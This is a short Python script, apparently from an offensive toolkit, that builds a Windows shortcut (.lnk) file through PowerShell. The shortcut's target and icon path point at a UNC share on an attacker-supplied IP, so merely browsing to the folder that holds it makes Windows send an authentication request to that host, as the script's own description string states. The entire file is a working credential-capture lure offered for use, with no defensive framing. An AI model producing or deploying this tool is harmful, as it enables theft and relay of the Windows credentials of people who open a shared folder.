import subprocess
import string
import random
import os
from colorama import init, Fore, Style

def create_lnk_file(attacker_ip, file_name=None):
    init(autoreset=True)
    current_directory = os.getcwd()
    
    if file_name is None:
        file_name = ''.join(random.choices(string.ascii_letters, k=8)) + ".lnk"
    else:
        file_name += ".lnk"
    
    file_path = os.path.join(current_directory, file_name)
    
    powershell_script = f"""
    $objShell = New-Object -ComObject WScript.Shell
    $lnk = $objShell.CreateShortcut("{file_path}")
    $lnk.TargetPath = "\\\\{attacker_ip}\\@pwn.png"
    $lnk.WindowStyle = 1
    $lnk.IconLocation = "%windir%\\system32\\shell32.dll, 3"
    $lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
    $lnk.HotKey = "Ctrl+Alt+O"
    $lnk.Save()
    """

    try:
        subprocess.run(["powershell", "-Command", powershell_script], check=True)
        print(f"{Fore.GREEN}[+] Shortcut (.lnk) file created successfully: {file_path}{Style.RESET_ALL}")
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")
